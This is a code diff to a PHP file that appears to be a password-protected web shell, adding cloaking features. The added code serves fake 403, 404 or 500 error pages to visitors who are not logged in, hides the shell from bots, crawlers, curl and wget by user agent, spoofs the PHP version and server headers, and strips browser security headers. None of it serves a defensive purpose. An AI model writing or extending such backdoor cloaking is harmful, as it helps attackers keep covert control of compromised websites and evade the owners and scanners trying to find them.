@@ -7,23 +7,32 @@
 @ignore_user_abort(1);
 session_start();
 
+// Multi Bypass Mode & Anti-Detection
+function showBypass($mode) {
+    switch($mode) {
+        case "403":
+            header("HTTP/1.0 403 Forbidden");
+            header("Status: 403 Forbidden");
+            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access this resource.</p><hr>'.$_SERVER['SERVER_SOFTWARE'].' Server at '.$_SERVER['HTTP_HOST'].' Port 80</body></html>');
+            break;
+        case "404":
+            header("HTTP/1.0 404 Not Found");
+            header("Status: 404 Not Found");
+            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>'.$_SERVER['SERVER_SOFTWARE'].' Server at '.$_SERVER['HTTP_HOST'].' Port 80</body></html>');
+            break;
+        case "500":
+            header("HTTP/1.0 500 Internal Server Error");
+            header("Status: 500 Internal Server Error");
+            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error and was unable to complete your request.</p><hr>'.$_SERVER['SERVER_SOFTWARE'].' Server at '.$_SERVER['HTTP_HOST'].' Port 80</body></html>');
+            break;
+    }
+}
+
 // Anti Blank Page & WAF Detection
 if(!isset($_SESSION['check'])) {
     $_SESSION['check'] = '1';
-    $servers = array('Apache','nginx','LiteSpeed','IIS');
-    $server = strtolower($_SERVER['SERVER_SOFTWARE']);
-    foreach($servers as $s) {
-        if(strpos($server, strtolower($s)) !== false) {
-            $_SESSION['server'] = $s;
-            break;
-        }
-    }
-    
-    // First visit shows 404
-    header("HTTP/1.0 404 Not Found");
-    header("Status: 404 Not Found");
-    $not_found = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>" . $_SESSION['server'] . " Server at " . $_SERVER['HTTP_HOST'] . " Port 80</body></html>";
-    die($not_found);
+    $_SESSION['bypass_mode'] = isset($_GET['mode']) ? $_GET['mode'] : '403';
+    showBypass($_SESSION['bypass_mode']);
 }
 
 // Password Protection dengan SHA256 
@@ -36,14 +45,21 @@ if (!isset($_SESSION['logged_in'])) {
             exit();
         }
     }
-    echo "<html><head><title>404 Not Found</title></head><body><pre align='center'><form method='post'><input autofocus type='password' name='pass'></form></pre></body></html>";
-    exit();
+    showBypass($_SESSION['bypass_mode']);
 }
 
-// WAF Bypass & Headers
+// Anti-Bot Headers
+$suspicious = array("bot","spider","crawler","curl","wget");
+foreach($suspicious as $ua) {
+    if(isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], $ua) !== false) {
+        showBypass($_SESSION['bypass_mode']);
+    }
+}
+
+// WAF & Headers Bypass
 @header_remove("X-Powered-By");
 @header("X-Powered-By: PHP/5.6.40");
-@header("Server: " . $_SESSION['server']);
+@header("Server: " . $_SERVER['SERVER_SOFTWARE']);
 @header_remove("X-Frame-Options");
 @header_remove("X-XSS-Protection");
 @header_remove("X-Content-Type-Options");
